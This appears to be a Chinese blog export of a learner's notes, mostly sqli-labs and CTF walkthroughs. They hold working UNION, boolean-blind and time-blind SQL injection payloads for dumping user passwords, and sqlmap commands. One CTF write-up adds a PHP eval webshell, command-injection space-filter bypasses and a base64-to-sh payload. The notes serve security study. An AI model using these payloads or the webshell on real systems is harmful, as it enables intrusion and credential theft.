<h2 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h2><p>套路还是一样</p>
<p><code>?id=1&#39;  and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1)))=1--+</code></p>
<p>这句话表示，选择数据库security中从第0行开始的第一行（也就是第0行）的字符串的第一个字符，并看该字符的ascii码是否为1。</p>
<p>设置如下</p>
<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126105448848.png" alt="image-20220126105448848"></p>
<p>结果如下</p>
<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126105504606.png" alt="image-20220126105504606"></p>
<p>然后把上述的从第0行开始改成从第1行开始（也就是第二行的字符串，也就是第二个表名）</p>
<p>修改和结果如下</p>
<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126105854694.png" alt="image-20220126105854694"></p>
<p>当改成4时，所有结果的长度均一致，说明不存在第5个表</p>
<p>总结</p>
<p>第一个数据表 101,109,97,105,108,115 =&gt;emails</p>
<p>第二个数据表 114,101,102,101,114,101,114,115 =&gt;referers</p>
<p>第三个数据表 117,97,103,101,110,116,115 =&gt;uagents</p>
<p>第四个数据表 117,115,101,114,115 =&gt;users</p>
<h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><p><code>?id=1&#39; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),1,1)))=1--+</code></p>
<p>这里就不解释了，差不多。</p>
<p>最后爆出字段为</p>
<p>第一个字段 105,100 =&gt;id</p>
<p>第二个字段 117,115,101,114,110,97,109,101 =&gt;username</p>
<p>第三个字段 112,97,115,115,119,111,114,100 =&gt;password</p>
<h2 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h2><p>爆破第一个username</p>
<p><code>?id=1&#39; and (select ascii(substr((select username from users limit 0,1),1,1)))=1--+</code></p>
<p>爆破第一个password</p>
<p><code>?id=1&#39; and (select ascii(substr((select password from users limit 0,1),1,1)))=1--+</code></p>
<p>其余的只是改一下行数，然后再进行爆破即可。</p>
<h1 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h1><p><strong>时间盲注：适用于无论语句正确与否，返回结果都一样。所以可以通过页面响应时间来判断注入的内容是否正确。</strong></p>
<h2 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h2><p><code>?id=1&#39; and sleep(5)--+</code></p>
<p>方法都一样，就是后面加一个<code>and sleep(5)</code>，来判断页面回显。</p>
<p>经过判断，该题为单引号闭合</p>
<h2 id="爆库-1"><a href="#爆库-1" class="headerlink" title="爆库"></a>爆库</h2><p><code>?id=1&#39; and if(ascii(substr(database(),1,1))=1,sleep(5),1)--+</code></p>
<p>这里用到了if语句<code>if(条件,语句1,语句2)</code>这里是如果数据库名称的第一个字符的ascii码是1，则沉睡5秒，否则执行1（也就是不沉睡），配合bp使用，结果如下</p>
<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126162028989.png" alt="image-20220126162028989"></p>
<h2 id="爆表-1"><a href="#爆表-1" class="headerlink" title="爆表"></a>爆表</h2><p><code>?id=1&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=1,sleep(5),1)--+</code></p>
<p>指令和结果都和第8题大同小异，不再解释</p>
<h2 id="爆字段-1"><a href="#爆字段-1" class="headerlink" title="爆字段"></a>爆字段</h2><p><code>?id=1&#39; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),1,1))=1,sleep(5),1)--+</code></p>
<p>指令和结果都和第8题大同小异，不再解释</p>
<h2 id="查数据-1"><a href="#查数据-1" class="headerlink" title="查数据"></a>查数据</h2><p>爆第一个用户名</p>
<p><code>?id=1&#39; and if(ascii(substr((select username from users limit 0,1),1,1))=1,sleep(5),1)--+</code></p>
<p>爆第一个密码</p>
<p><code>?id=1&#39; and if(ascii(substr((select password from users limit 0,1),1,1))=1,sleep(5),1)--+</code></p>
<h1 id="第10关"><a href="#第10关" class="headerlink" title="第10关"></a>第10关</h1><p>除了闭合方式为双引号型，其余和第9关都一样</p>
<p><code>?id=1&quot; and sleep(5)--+</code></p>
]]></content>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlilabs第一关</title>
    <url>/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/</url>
    <content><![CDATA[<h1 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h1><ol>
<li>判断注入类型</li>
<li>判断字段数</li>
<li>判断回显点</li>
<li>爆库名</li>
<li>爆表名</li>
<li>爆字段名</li>
<li>查数据</li>
</ol>
<span id="more"></span>

<p>为了方便找错，在源码处可以让其输出所执行的sql命令，方法如下</p>
<p><img src="/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/image-20220119233021588.png" alt="image-20220119233021588"></p>
<h1 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h1><p>首先输入id=1，回显正常</p>
<p><img src="/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/image-20220119233152339.png" alt="image-20220119233152339"></p>
<p>这里的<code>LIMIT 0,1</code>的意思是输出0行后1行的内容。</p>
<p>然后尝试加单引号   <code>&#39;</code>  回显错误</p>
<p><img src="/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/image-20220119233346623.png" alt="image-20220119233346623"></p>
<p>尝试加<code>--+</code>或者<code>%23</code>，这里二者效果一样，都是注释的方法，<code>--+</code>表示<code>--空格 </code> 在URL中空格可以由+表示，然后<code>%23</code>是 # 的URL编码，也是注释。加完之后回显正常</p>
<p><img src="/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/image-20220119233931711.png" alt="image-20220119233931711"></p>
<p>由此可知，该注入类型为字符型，闭合方式为单引号。</p>
<h1 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h1><p>union有一个非常严格的约束条件，因为是联合查询，必须保证字段数一致，即两个查询结果有相同的列数，因此，若要判断字段数，即可根据<code>order by n;</code>的回显即可，构造如下sql命令</p>
<p><img src="/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/image-20220119234541896.png" alt="image-20220119234541896"></p>
<p>发现1-3都能正常回显，而4不行，即可得知字段数为3。</p>
<p>这里的<code>order by n;</code>是根据第几列顺序排列查询结果，如图加与不加order by 3的区别</p>
<p><img src="/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/image-20220119235023249.png" alt="image-20220119235023249"></p>
<p><img src="/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/image-20220119235118690.png" alt="image-20220119235118690"></p>
<p><strong>注意：此处使用order by仅仅改变查询结果的顺序，对原本数据库排列顺序没有影响</strong></p>
<h1 id="判断回显点"><a href="#判断回显点" class="headerlink" title="判断回显点"></a>判断回显点</h1><p>回显点说白了就是回显的点位</p>
<p>联合查询输出是严格按照顺序进行的，因此，当id=1<strong>存在时</strong>会在第0行输出第1个sql语句的查询结果，也就是如下图所示</p>
<p><img src="/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/image-20220119235809113.png" alt="image-20220119235809113"></p>
<p>它确实执行了我们第二条sql语句，也就是union后面的select语句，只是没有显示，因此我们可以通过以下两种方法，输出第二条sql语句的查询结果</p>
<p>LIMIT后的第一个参数是输出记录的初始位置，第二个参数偏移量，偏移多少，输出的条目就是多少。比如说，<code>limit 1,3</code> 就是输出2，3，4行的内容。此时的表为</p>
<p><img src="/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/image-20220120001307291.png" alt="image-20220120001307291"></p>
<p>构造以下语句，输出第二行（由于题目限制，不能两行同时输出，即<code>limit 0,2</code>无用）</p>
<p><code>id=1&#39; union select 1,2,3 limit 1,1 --+</code></p>
<p>输入不存在的-1</p>
<p><code>id=-1&#39; union select 1,2,3 --+</code></p>
<p><strong>注意：此处的1，2，3内容随便换</strong></p>
<p>实质就是select语句</p>
<p><img src="/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/image-20220120001832155.png" alt="image-20220120001832155"></p>
<p>得到如下回显，即可知道，2，3处为回显点</p>
<p><img src="/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/image-20220120001634734.png" alt="image-20220120001634734"></p>
<h1 id="暴库名"><a href="#暴库名" class="headerlink" title="暴库名"></a>暴库名</h1><p>回显点已经知道，则可直接执行<code>database()</code>  和  <code>version()</code>  来查看数据库名和MySQL数据库版本</p>
<p><code>id=-1&#39; union select 1,database(),version() -++</code></p>
<p><img src="/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/image-20220120002239875.png" alt="image-20220120002239875"></p>
<h1 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h1><p>构造以下语句</p>
<p><code>id=-1&#39; union select 1,group_concat(table_name),version() from information_schema.tables where table_schema=&#39;security&#39; --+</code></p>
<p>这句话的意思是，从information_schema库中tables表中table_name列中找与table_scheam列为security的元素，information_schema是mysql<strong>自带的库</strong>，记录了该数据库<strong>所有的表名和字段名</strong></p>
<p>也就是找这些东西</p>
<p><img src="/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/image-20220120003415735.png" alt="image-20220120003415735"></p>
<p><img src="/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/image-20220120003558071.png" alt="image-20220120003558071"></p>
<p>这里的表可以先看users，如果不对再看其他的。</p>
<h1 id="爆字段名"><a href="#爆字段名" class="headerlink" title="爆字段名"></a>爆字段名</h1><p>构造如下语句</p>
<p><code>id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; --+</code></p>
<p>这句话的意思是，从information_schema库中colums表中column_name列找table_schema列为security和table_name列为user的元素</p>
<p>即如下这些</p>
<p><img src="/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/image-20220120004823668.png" alt="image-20220120004823668"></p>
<p><img src="/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/image-20220120004905808.png" alt="image-20220120004905808"></p>
<h1 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h1><p>构造如下语句</p>
<p><code>id=-1&#39; union select 1,group_concat(username,0x5c,password),3 from security.users --+</code></p>
<p>这句话的意思是在security库的users表中找出所有username与对应的password，这里面的0x5c是\的十六进制编码。也可以是别的</p>
<p><img src="/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/image-20220120005243708.png" alt="image-20220120005243708"></p>
<p>完成。</p>
]]></content>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlilabs第三关</title>
    <url>/2022/01/22/sqlilabs%E7%AC%AC%E4%B8%89%E5%85%B3/</url>
    <content><![CDATA[<p>第三关和前两关没什么区别，主要是闭合方式的差异，这里顺便总结一下闭合方式</p>
<ul>
<li>整型</li>
<li>单引号</li>
<li>双引号</li>
<li>单引号加括号</li>
<li>双引号加括号</li>
</ul>
<span id="more"></span>

<p>首先判断闭合方式</p>
<p><code>?id=1&#39;</code></p>
<p><code>?id=1&quot;</code></p>
<p>**1.**如果都报错，就是整型</p>
<p>**2.**如果单引号报错，双引号不报错，尝试</p>
<p><code>?id=1&#39;--+</code></p>
<p>如果不报错就是单引号闭合，报错就是单引号加括号闭合</p>
<p>**3.**如果单引号不报错，双引号报错，尝试</p>
<p><code>id=1&quot;--+</code></p>
<p>无报错则双引号闭合，报错则双引号加括号闭合</p>
<p><strong>任何闭合方式在没有遇到相对应的闭合时，都会把这个符号当做一个整体，注释符也没用！！</strong></p>
<p>单引号</p>
<p><img src="/2022/01/22/sqlilabs%E7%AC%AC%E4%B8%89%E5%85%B3/image-20220122200408676.png" alt="image-20220122200408676"></p>
<p>双引号</p>
<p><img src="/2022/01/22/sqlilabs%E7%AC%AC%E4%B8%89%E5%85%B3/image-20220122200430772.png" alt="image-20220122200430772"></p>
<p>尝试?<code>id=1&#39;--+</code></p>
<p><img src="/2022/01/22/sqlilabs%E7%AC%AC%E4%B8%89%E5%85%B3/image-20220122200511915.png" alt="image-20220122200511915"></p>
<p>则可判断闭合方式是<strong>单引号加括号</strong></p>
<p>其余与第一关就一样了</p>
<p>判断字段数、回显点、暴库名就舍去了</p>
<p>爆表名</p>
<p><code>?id=-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema =&#39;security&#39;--+</code></p>
<p>爆字段名</p>
<p><code>?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema =&#39;security&#39; and table_name=&#39;users&#39;--+</code></p>
<p>查数据</p>
<p><code>?id=-1&#39;) union select 1,group_concat(username,1,password),3 from security.users--+</code></p>
<p>完成</p>
]]></content>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlilabs第二关（sqlmap初体验）</title>
    <url>/2022/01/20/sqlilabs%E7%AC%AC%E4%BA%8C%E5%85%B3/</url>
    <content><![CDATA[<h1 id="先来一遍基本流程"><a href="#先来一遍基本流程" class="headerlink" title="先来一遍基本流程"></a>先来一遍基本流程</h1><ol>
<li>判断注入类型</li>
<li>判断字段数</li>
<li>判断回显点</li>
<li>暴库名</li>
<li>爆表名</li>
<li>爆字段名</li>
<li>查数据</li>
</ol>
<span id="more"></span>

<h1 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h1><p>第二关没什么好说的了，思路和第一关大同小异，只是判断注入类型的时候，这里是整数型，也就是没有单引号，后面也不用加注释符号，这里需要注意的是，用到where 的时候，=的东西如果是字符串，不要忘记加  ‘  ‘  。</p>
<p>然后就是命令再熟悉一下</p>
<p>爆表名</p>
<p><code>id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;</code>(schema是构架的意思)</p>
<p>爆字段名</p>
<p><code>id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name =&#39;users&#39; and table_schema =&#39;security&#39;</code></p>
<p>查数据</p>
<p><code>id=-1 union select 1,group_concat(username,1,password),3 from security.users</code></p>
<p>最后得出结果</p>
<p><img src="/2022/01/20/sqlilabs%E7%AC%AC%E4%BA%8C%E5%85%B3/image-20220120190354876.png" alt="image-20220120190354876"></p>
<h1 id="利用sqlmap"><a href="#利用sqlmap" class="headerlink" title="利用sqlmap"></a>利用sqlmap</h1><p>安装：<code>git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</code></p>
<p>详细用法可参考readme.md文件</p>
<h2 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h2><p><code>python sqlmap.py -u http://192.168.153.133/sqli-labs-master/Less-2/?id=1</code></p>
<p><img src="/2022/01/20/sqlilabs%E7%AC%AC%E4%BA%8C%E5%85%B3/image-20220120194754745.png" alt="image-20220120194754745"></p>
<p>这里推荐了4种注入方法，其实这一步做不做无所谓。主要是获取数据库名</p>
<p><img src="/2022/01/20/sqlilabs%E7%AC%AC%E4%BA%8C%E5%85%B3/image-20220120195046058.png" alt="image-20220120195046058"></p>
<p><strong>注意：命令对大小写敏感</strong></p>
<h2 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h2><p><img src="/2022/01/20/sqlilabs%E7%AC%AC%E4%BA%8C%E5%85%B3/image-20220120195345729.png" alt="image-20220120195345729"></p>
<h2 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h2><p>执行 </p>
<p><code>python sqlmap.py -u http://192.168.153.133/sqli-labs-master/Less-2/?id=1 -D security -T users --dump</code></p>
<p><img src="/2022/01/20/sqlilabs%E7%AC%AC%E4%BA%8C%E5%85%B3/image-20220120195606377.png" alt="image-20220120195606377"></p>
<p>同样也可以使用该命令格式爆其他表数据，如emalis</p>
<p><img src="/2022/01/20/sqlilabs%E7%AC%AC%E4%BA%8C%E5%85%B3/image-20220120195802180.png" alt="image-20220120195802180"></p>
<p>相比于手工注入简单多了哦</p>
]]></content>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlilabs第四关</title>
    <url>/2022/01/22/sqlilabs%E7%AC%AC%E5%9B%9B%E5%85%B3/</url>
    <content><![CDATA[<p>p判断闭合方式</p>
<p>首先</p>
<p><code>id=1&#39;</code></p>
<p><code>id=1&quot;</code></p>
<p>若都报错是整型</p>
<p>若仅有单引号报错，则尝试</p>
<p><code>id=1&#39;--+</code></p>
<p>不报错就是单引号闭合，否则为单引号加括号</p>
<p>若仅有双引号报错，则尝试</p>
<p><code>id=1&quot;--+</code></p>
<p>不报错就是双引号闭合，否则为双引号加括号</p>
<span id="more"></span>



<p>开始判断</p>
<p>单引号</p>
<p><img src="/2022/01/22/sqlilabs%E7%AC%AC%E5%9B%9B%E5%85%B3/image-20220122202426648.png" alt="image-20220122202426648"></p>
<p>双引号</p>
<p><img src="/2022/01/22/sqlilabs%E7%AC%AC%E5%9B%9B%E5%85%B3/image-20220122202438806.png" alt="image-20220122202438806"></p>
<p>尝试<code>id=1&quot;--+</code></p>
<p><img src="/2022/01/22/sqlilabs%E7%AC%AC%E5%9B%9B%E5%85%B3/image-20220122202506543.png" alt="image-20220122202506543"></p>
<p>则这是双引号加括号闭合</p>
<p>其余都一样了，不做解释了</p>
<p>最终结果</p>
<p><img src="/2022/01/22/sqlilabs%E7%AC%AC%E5%9B%9B%E5%85%B3/image-20220122202932430.png" alt="image-20220122202932430"></p>
<p>总结一下前四关，都可以用联合注入，比较简单，后面就是别的注入方式了（呜呜呜，我是菜鸡），接下来也要好好加油呀！！！</p>
]]></content>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>“解决codeblocks无法运行c++程序&quot;</title>
    <url>/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/</url>
    <content><![CDATA[<p>下载Codeblocks后，创建新程序后，发现点击运行后无法弹出控制台，如图</p>
<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120305308.png" alt="image-20211127120305308"></p>
<span id="more"></span>

<p>#法1</p>
<p>查看compiler setting中的路径，如下图</p>
<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120458845.png" alt="image-20211127120458845"></p>
<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120607794.png" alt="image-20211127120607794"></p>
<p>修改MinGW的路径后，解决问题</p>
<p>#法2（法1未解决）</p>
<p>路径正常，修改路径后显示</p>
<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120747653.png" alt="image-20211127120747653"></p>
<p>即缺少GNU GCC Compiler，说白了就是MinGW文件不完整，尝试删除WinGW文件夹，然后重新下载</p>
<p>下载地址：链接：<a href="https://pan.baidu.com/s/12OXmsCeZM2zIrK95WTs7Ag">https://pan.baidu.com/s/12OXmsCeZM2zIrK95WTs7Ag</a>    提取码：axen</p>
<p>将该压缩包解压后，解决问题</p>
<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127121331465.png" alt="image-20211127121331465"></p>
]]></content>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>刷题记录-2</title>
    <url>/2022/02/04/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-1/</url>
    <content><![CDATA[<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>尝试用万能密码，万能密码原理<a href="https://blog.csdn.net/hxhxhxhxx/article/details/108020010">点这</a>。</p>
<p><code>?username=1&#39;%23 &amp;password=1</code>这里用的是<code>%23</code>而没有用<code>--+</code>，<code>--+</code>不行的原因我也不太清楚，</p>
<p>得到一串很像md5加密的密文。但最终没有解出来。</p>
<p>然后进行常规的联合注入，得到</p>
<span id="more"></span>

<p>字段数：3</p>
<p>库名：geek</p>
<p>表名：geekuser，l0ve1ysq1</p>
<p>l0ve1ysq1表下的字段名：id，username，password</p>
<p>geekuser表下的字段名：id，username，password</p>
<p>然后依次查看username和password，发现geekuser里面的用户名和密码就是用万能密码登录得到的，然后再查看l0ve1ysq1里面的用户名和密码，得到flag</p>
<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>之前碰到一次Exec的题目，所以我们直接上Linux命令，但是发现<code>cat flag.php</code>和<code>cd ../</code>还有上传木马的<code>echo &#39;&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;&#39; &gt; hack.php</code> 等指令都用不了，看来是被过滤掉了，后来才知道这是过滤了空格space。</p>
<p><strong>过滤空格的解决办法</strong></p>
<ol>
<li>$IFS</li>
<li>${IFS}</li>
<li>$IFS$1 //$1改成$加其他数字貌似都行</li>
<li>&lt; </li>
<li>&lt;&gt; </li>
<li>{cat,flag.php}  //用逗号实现了空格功能</li>
<li>%20 </li>
<li>%09 </li>
</ol>
<p>一个一个试，发现只有<code>$IFS$1</code>管用，然后构造<code>cat$IFS$1flag.php</code>,结果提示过滤了flag字符串，所以试着cat一下index.php，结果如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段代码我也看不太懂，WP说是过滤了很多符号。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方法一：我们构造/?ip=1;a=g;cat$IFS$1fla$a.php然后在注释里面得到flag</span><br><span class="line">方法二：cat$IFS$9`ls`,这里的反引号是内联，所谓内联，就是将反引号内命令的输出作为输入执行。</span><br><span class="line">方法三：echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh这句是先输出cat flag.php的base64编码，然后再解码，然后再执行。其中的|表示将前一个命令的输出作为后一个命令的输入。</span><br></pre></td></tr></table></figure>

<h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>进入题目后检查源码发现Secret.php文件，进入后查看源码未发现任何东西，而且给出的网址进不去。根据提示</p>
<p>**It doesn’t come from ‘<a href="https://sycsecret.buuoj.cn&/#39;**%E6%84%8F%E6%80%9D%E5%B0%B1%E6%98%AF%E4%B8%8D%E6%98%AF%E6%9D%A5%E6%BA%90%E4%BA%8Ehttps://Sycsecret.buuoj.cn%E7%9A%84%E8%B5%84%E6%BA%90%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AFReferer%E4%B8%8D%E6%98%AFhttps://Sycsecret.buuoj.cn%E3%80%82%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%A6%81%E4%BF%AE%E6%94%B9header%E5%A4%B4%EF%BC%8C%E6%B7%BB%E5%8A%A0[Referer](https://blog.csdn.net/shenqueying/article/details/79426884)%EF%BC%8C%E8%BF%99%E9%87%8C%E7%94%A8Bp%E4%BF%AE%E6%94%B9%E3%80%82">https://Sycsecret.buuoj.cn&#39;**意思就是不是来源于https://Sycsecret.buuoj.cn的资源，也就是Referer不是https://Sycsecret.buuoj.cn。所以我们要修改header头，添加[Referer](https://blog.csdn.net/shenqueying/article/details/79426884)，这里用Bp修改。</a></p>
<p><code>Referer:https://Sycsecret.buuoj.cn</code></p>
<p>Request为</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Secret.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node4.buuoj.cn:28174</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line">Referer:https://Sycsecret.buuoj.cn</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=17d26e27951337-0f7088736cbf9a-b7a1438-144000-17d26e27952da6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>注意Referer不能在Cookie下面，且不能乱空行。</strong>结果如图</p>
<p><img src="/2022/02/04/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-1/image-20220211152257573.png" alt="image-20220211152257573"></p>
<p>所以我们继续修改浏览器标识</p>
<p><code>User-Agent:Syclover</code></p>
<p>全部Request为</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Secret.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node4.buuoj.cn:28174</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Syclover</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line">Referer:https://Sycsecret.buuoj.cn</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=17d26e27951337-0f7088736cbf9a-b7a1438-144000-17d26e27952da6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后Response提示只能在本地浏览，则继续添加<a href="https://www.runoob.com/w3cnote/http-x-forwarded-for.html">X-Forwarded-For</a>(<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-For">XFF</a>)</p>
<p><code>X-Forwarded-For:127.0.0.1</code></p>
<p>全部Request为</p>
